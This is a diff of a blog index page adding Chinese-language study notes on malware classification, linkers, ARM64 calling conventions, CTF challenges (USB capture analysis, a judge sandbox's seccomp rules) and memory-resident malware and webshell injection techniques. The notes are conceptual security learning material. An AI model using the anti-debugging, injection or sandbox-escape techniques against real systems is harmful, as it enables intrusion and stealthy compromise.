@@ -156,6 +156,581 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot20/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/ML/Few-Shot20/" class="post-title-link" itemprop="url">使用节表分布信息的基于图像的恶意软件分类</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-12 16:13:22 / Modified: 11:42:30" itemprop="dateCreated datePublished" datetime="2023-10-12T16:13:22+08:00">2023-10-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>Image-based malware classification using section distribution information,发表在B刊，Computers&amp;Security,2021.</p>
+</blockquote>
+<h2 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h2><p>虽然需要大量的计算，但是输入数据里选取的数据的信息越多，准确率越高。</p>
+<p>作者的想法和我的想法：节表的分布信息能够更好的表征恶意软件。</p>
+<h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><p>已有的灰度图里，相同家族的样本具有相似的二级制内容和图片纹理。</p>
+<p><strong>相同家族的样本具有相似的节表分布信息，节表数量、节表顺序和节表尺寸。</strong></p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>和我的思路一致，从Opcode、Gray变为了带有节表信息的灰度图。</p>
+<p>VGG16+多分类SVM。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>只能处理未打包的恶意软件，这样才能够保证节表的分布信息没有被混淆。</p>
+<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="灰度图评价"><a href="#灰度图评价" class="headerlink" title="灰度图评价"></a>灰度图评价</h3><p>PE文件里由于文件对齐，会有大量的填充数据（0或其他值），而各个样本填充的位数不一致。</p>
+<p>如下图所示，灰度图里的界限和实际的界限对应得并不是很好。</p>
+<p>已有的灰度图里能够判断出一部分节表信息，但是会有很多错误 。</p>
+<p><img src="/categories/ML/Few-Shot20/1697080673588.png" alt="1697080673588"></p>
+<h3 id="作者提出的-算法"><a href="#作者提出的-算法" class="headerlink" title="作者提出的 算法"></a>作者提出的 算法</h3><p>图片定宽256（16的倍数，hex视图），高度跟随文件大小变化。用于对节表分界的<strong>行厚度要发生变化</strong>，</p>
+<p><img src="/categories/ML/Few-Shot20/1697081574246.png" alt="1697081574246"></p>
+<p><img src="/categories/ML/Few-Shot20/1697081604215.png" alt="1697081604215"></p>
+<p><img src="/categories/ML/Few-Shot20/1697081631521.png" alt="1697081631521"></p>
+<h3 id="最后分类模型的选取"><a href="#最后分类模型的选取" class="headerlink" title="最后分类模型的选取"></a>最后分类模型的选取</h3><p>25088的数据维度，维度诅咒以及数据稀疏。</p>
+<p>SVM适合处理高维数据，它的计算复杂度取决于它的支持向量数，而不是空间维度。</p>
+<p>SVM处理大规模数据效果也很好。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p>VXV：<a target="_blank" rel="noopener" href="https://archive.org/download/vxheavens-2010-05-18">VX-Heaven</a> VirusShare</p>
+<p>BIG-2015微软恶意软件分类数据集</p>
+<h3 id="实验设置"><a href="#实验设置" class="headerlink" title="实验设置"></a>实验设置</h3>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders06/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/Linkers&Loaders06/" class="post-title-link" itemprop="url">Chap11-glibc入口函数</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-10-11 17:58:58 / Modified: 16:44:34" itemprop="dateCreated datePublished" datetime="2023-10-11T17:58:58+08:00">2023-10-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor %ebp,%ebp ;表明这是程序的最外层函数，初始化栈</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E6%B8%B8%E6%88%8F%E7%89%88%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/%E6%B8%B8%E6%88%8F%E7%89%88%E6%9D%83/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-09 17:48:03" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:03+08:00">2023-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-15 19:21:30" itemprop="dateModified" datetime="2023-09-15T19:21:30+08:00">2023-09-15</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>版权不包含思想，</p>
+<p>法定8种作品。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/ycb01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/ycb01/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-09 17:48:02" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:02+08:00">2023-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-02 11:47:12" itemprop="dateModified" datetime="2023-09-02T11:47:12+08:00">2023-09-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v9 = *(_QWORD *)__stack_chk_guard_ptr;<span class="comment">//防止堆栈溢出</span></span><br><span class="line">  <span class="comment">//告诉系统，阻止调试器依附</span></span><br><span class="line">result = ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>);<span class="comment">//利用ptrace反调试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="ARM64调用约定"><a href="#ARM64调用约定" class="headerlink" title="ARM64调用约定"></a>ARM64调用约定</h2><p>在ARM 64位体系结构中，函数参数通常会存储在一组特定的寄存器中，这些寄存器包括：</p>
+<ul>
+<li>参数0（x0）：用于存储第一个函数参数。</li>
+<li>参数1（x1）：用于存储第二个函数参数。</li>
+<li>参数2（x2）：用于存储第三个函数参数。</li>
+<li>参数3（x3）：用于存储第四个函数参数。</li>
+<li>参数4-7（x4-x7）：用于存储额外的函数参数。</li>
+</ul>
+<p>所以，根据ARM 64位体系结构的调用约定，参数应该存储在这些寄存器中，而不是ECX和EDX。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">48</span>h] v9   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">50</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">38</span>h] v8   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">40</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">28</span>h] v7   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">30</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">18</span>h] v6   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">20</span>h]       | (<span class="number">8</span> 字节间隔)</span><br><span class="line">+----------------+</span><br><span class="line">| [xsp+<span class="number">8</span>h] v5   | (<span class="number">8</span> 字节)</span><br><span class="line">+----------------+</span><br><span class="line">| ... (下面的栈帧内容) |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/python_bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/python_bypass/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-09 17:48:02" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:02+08:00">2023-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-09 11:14:24" itemprop="dateModified" datetime="2023-09-09T11:14:24+08:00">2023-09-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="LessEQualmore"><a href="#LessEQualmore" class="headerlink" title="LessEQualmore"></a>LessEQualmore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc chal-lessequalmore.chal.hitconctf.com 11111</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">*** Flag Checker ***</span><br><span class="line">You entered:</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">Sorry, wrong flag!</span><br></pre></td></tr></table></figure>
+<h2 id="Not-just-usbpcap"><a href="#Not-just-usbpcap" class="headerlink" title="Not just usbpcap"></a>Not just usbpcap</h2><h3 id="鼠标协议"><a href="#鼠标协议" class="headerlink" title="鼠标协议"></a>鼠标协议</h3><pre><code>  每一个数据包的数据区有四个字节，
+</code></pre><p>第一个字节代表按键，当取 0x00 时，代表没有按键、为 0x01 时，代表按左键，为 0x02 时，代表当前按键为右键。第二个字节可以看成是一个 signed byte 类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。 </p>
+<p>键盘数据包的数据长度为 8 个字节，击键信息集中在第 3 个字节 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r ./release.pcapng -T fields -e usb.capdata &gt;usbdata.txt</span><br><span class="line">python UsbKeyboardDataHacker.py ./release.pcapng</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">l USB UART  异步接收传送器</span><br><span class="line">l USB HID 交互式人性化接口</span><br><span class="line">l USB Memory  数据存储</span><br><span class="line">Audio/Video Distribution Transport Protocol）：</span><br><span class="line"></span><br><span class="line">AVDTP是一种蓝牙协议，用于传输音频和视频数据。它定义了在蓝牙设备之间传输多</span><br><span class="line">媒体数据流的规则和方法。AVDTP的作用是管理多媒体数据的流动，包括数据的传输、控制和同步。</span><br><span class="line">HCI_EVT（Host Controller Interface Event）：</span><br><span class="line"></span><br><span class="line">HCI_EVT是蓝牙协议栈中的一部分，用于管理与蓝牙硬件控制器之间的通信。它定义了一组事件和命令，允许主机设备与蓝牙硬件进行交互，包括连接、数据传输和配置等操作。</span><br><span class="line">USBHUB（USB Hub Protocol）：</span><br><span class="line"></span><br><span class="line">USBHUB是与USB（Universal Serial Bus）相关的协议，用于管理USB集线器（Hub）。USB集线器允许多个USB设备连接到单个USB端口，USBHUB协议定义了集线器的工作原理和与主机设备之间的通信方式。</span><br><span class="line">RTP（Real-time Transport Protocol）：</span><br><span class="line"></span><br><span class="line">RTP是一种用于实时数据传输的协议，通常用于音频和视频流的传输。它提供了时间同步、流标识和数据流传输的机制，以确保实时媒体数据能够以低延迟和高质量传输。RTP通常与RTCP（RTP Control Protocol）一起使用，后者用于监控和管理传输质量。</span><br></pre></td></tr></table></figure>
+<p> <code>Bus 002 Device 002</code> 代表 <code>usb</code> 设备正常连接， </p>
+<h3 id="蓝牙协议"><a href="#蓝牙协议" class="headerlink" title="蓝牙协议"></a>蓝牙协议</h3><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p><img src="/categories/CTF/python_bypass/1694226682107.png" alt="1694226682107"></p>
+<h3 id="后台仓库"><a href="#后台仓库" class="headerlink" title="后台仓库"></a>后台仓库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/QingdaoU/Judger</span><br></pre></td></tr></table></figure>
+<p>main.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">max_process_number</span><br><span class="line">max_output_size</span><br><span class="line">exe_path</span><br><span class="line">input_path &quot;/dev/stdin&quot;</span><br><span class="line">output_path</span><br><span class="line">error_path &quot;/dev/stderr&quot;</span><br><span class="line">args</span><br><span class="line"> env</span><br><span class="line"> log_path judger.log</span><br><span class="line"> seccomp_rule_name seccomp_rule_name-&gt;sval[0]</span><br><span class="line"> uid 65534</span><br><span class="line"> gid 65534</span><br></pre></td></tr></table></figure>
+<p>child.c  child_process</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proc = subprocess.Popen(proc_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = proc.communicate()</span><br><span class="line">return json.loads(out.decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
+<p>general.c</p>
+<ul>
+<li><p>socket、fork、vfork、kill；</p>
+<ul>
+<li>execveat</li>
+</ul>
+<p>禁止以w、rw使用open、openat；</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//c_cpp.c</span><br><span class="line"></span><br><span class="line">&#123;SCMP_SYS(read), SCMP_SYS(fstat),</span><br><span class="line">SCMP_SYS(mmap), SCMP_SYS(mprotect),</span><br><span class="line">SCMP_SYS(munmap), SCMP_SYS(uname),</span><br><span class="line">SCMP_SYS(arch_prctl), SCMP_SYS(brk),</span><br><span class="line">SCMP_SYS(access), SCMP_SYS(exit_group),</span><br><span class="line">SCMP_SYS(close), SCMP_SYS(readlink),</span><br><span class="line">SCMP_SYS(sysinfo), SCMP_SYS(write),</span><br><span class="line">SCMP_SYS(writev), SCMP_SYS(lseek),</span><br><span class="line">SCMP_SYS(clock_gettime), SCMP_SYS(pread64)&#125;; </span><br></pre></td></tr></table></figure>
+<p>  不让写文件时：</p>
+<p>禁止以w、rw使用open、openat；</p>
+<p>或者在允许写文件时：</p>
+<p> 允许进程调用 <code>open</code> 系统调用。 </p>
+<p> 允许进程调用 <code>openat</code> 系统调用，类似于 <code>open</code>，但可以指定文件的相对路径。 </p>
+<p> 允许进程调用 <code>dup2</code> 系统调用，用于复制文件描述符到指定的文件描述符号码。 </p>
+<p> 允许进程调用 <code>dup3</code> 系统调用，类似于 <code>dup2</code>，但支持更多选项 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">max_memory=1024 * 1024 * 128, max_stack=32 * 1024 * 1024,</span><br><span class="line">                   max_process_number=200, max_output_size=10000, exe_path=&quot;1.out&quot;,</span><br><span class="line">                   input_path=&quot;1.in&quot;, output_path=&quot;1.out&quot;, error_path=&quot;1.out&quot;,</span><br><span class="line">                   args=args, env=[&quot;a=&quot;], log_path=&quot;1.log&quot;,</span><br><span class="line">                   seccomp_rule_name=&quot;1.so&quot;, uid=0, gid=0)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#base.py</span><br><span class="line">   config = &#123;&quot;max_cpu_time&quot;: 1000,</span><br><span class="line">                  &quot;max_real_time&quot;: 3000,</span><br><span class="line">                  &quot;max_memory&quot;: 128 * 1024 * 1024,</span><br><span class="line">                  &quot;max_stack&quot;: 32 * 1024 * 1024,</span><br><span class="line">                  &quot;max_process_number&quot;: 10,</span><br><span class="line">                  &quot;max_output_size&quot;: 1024 * 1024,</span><br><span class="line">                  &quot;exe_path&quot;: &quot;/bin/ls&quot;,</span><br><span class="line">                  &quot;input_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;output_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;error_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;args&quot;: [],</span><br><span class="line">                  &quot;env&quot;: [&quot;env=judger_test&quot;, &quot;test=judger&quot;],</span><br><span class="line">                  &quot;log_path&quot;: &quot;judger_test.log&quot;,</span><br><span class="line">                  &quot;seccomp_rule_name&quot;: None,</span><br><span class="line">                  &quot;uid&quot;: 0,</span><br><span class="line">                  &quot;gid&quot;: 0&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def init_workspace(self, language):</span><br><span class="line">    base_workspace = &quot;/tmp&quot;</span><br><span class="line">    workspace = os.path.join(base_workspace, language)</span><br><span class="line">    shutil.rmtree(workspace, ignore_errors=True)</span><br><span class="line">    os.makedirs(workspace)</span><br><span class="line">    return workspace</span><br><span class="line"></span><br><span class="line">def tearDown(self):</span><br><span class="line">    shutil.rmtree(self.workspace, ignore_errors=True)</span><br><span class="line"></span><br><span class="line">def rand_str(self):</span><br><span class="line">    return &quot;&quot;.join([random.choice(&quot;123456789abcdef&quot;) for _ in range(12)])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于12位密码，难以预测。</p>
+<h2 id="Lisp-js"><a href="#Lisp-js" class="headerlink" title="Lisp.js"></a>Lisp.js</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-title-link" itemprop="url">Memory-resident Malware</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-09-25 09:58:58 / Modified: 10:16:48" itemprop="dateCreated datePublished" datetime="2023-09-25T09:58:58+08:00">2023-09-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>主打隐蔽，：</p>
+<p>内存中，无文件落地到磁盘；</p>
+<ul>
+<li>内核级别操作 rootkit</li>
+<li>在内存中生成文件</li>
+<li><strong>反射式DLL注入</strong>：这是一种技术，它允许恶意软件在不使用硬盘上的文件的情况下，将DLL注入到进程的内存中。 </li>
+<li><p><strong>进程注入</strong>：攻击者可以将自己的恶意进程注入到合法进程的地址空间中 </p>
+</li>
+<li><p><strong>DLL注入</strong>：恶意软件可以注入恶意动态链接库（DLL）到其他进程的内存中 </p>
+</li>
+</ul>
+<h2 id="Webshell的内存马分类："><a href="#Webshell的内存马分类：" class="headerlink" title="Webshell的内存马分类："></a>Webshell的内存马分类：</h2><p>1.servlet-api型<br>通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p>
+<p>2.字节码增强型<br>通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。</p>
+<p>客户端—&gt;Listener—&gt;Filter—&gt;Servlet</p>
+<p> 在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理 ；</p>
+<p> Filter.doFilter  —&gt; 调用 FilterChain.doFilter ( FilterChain Object)—&gt; 激活目标 Servlet 的 service  ；</p>
+<p> filter链<br>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。 </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/Linkers&Loaders05/" class="post-title-link" itemprop="url">Chap09-DLL</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-09-08 17:58:58 / Modified: 18:11:44" itemprop="dateCreated datePublished" datetime="2023-09-08T17:58:58+08:00">2023-09-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
